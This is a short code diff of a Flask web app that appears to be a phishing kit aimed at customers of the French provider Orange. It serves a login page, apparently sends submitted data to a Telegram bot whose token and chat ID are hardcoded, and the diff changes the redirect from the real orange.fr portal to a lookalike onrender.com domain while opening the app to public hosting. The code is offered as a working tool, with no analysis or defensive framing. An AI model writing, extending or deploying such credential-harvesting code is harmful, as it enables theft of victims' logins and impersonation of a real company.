@@ -8,7 +8,6 @@ app = Flask(__name__)
 BOT_TOKEN = "8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A"
 CHAT_ID = "6297861735"
 
-
 @app.route('/', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
@@ -25,10 +24,11 @@ def login():
         except Exception as e:
             print("Erreur Telegram:", e)
 
-        return redirect("https://www.orange.fr/portail/")
+        return redirect("https://orange-mail-snsc.onrender.com//")
 
     return render_template('login.html')
 
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
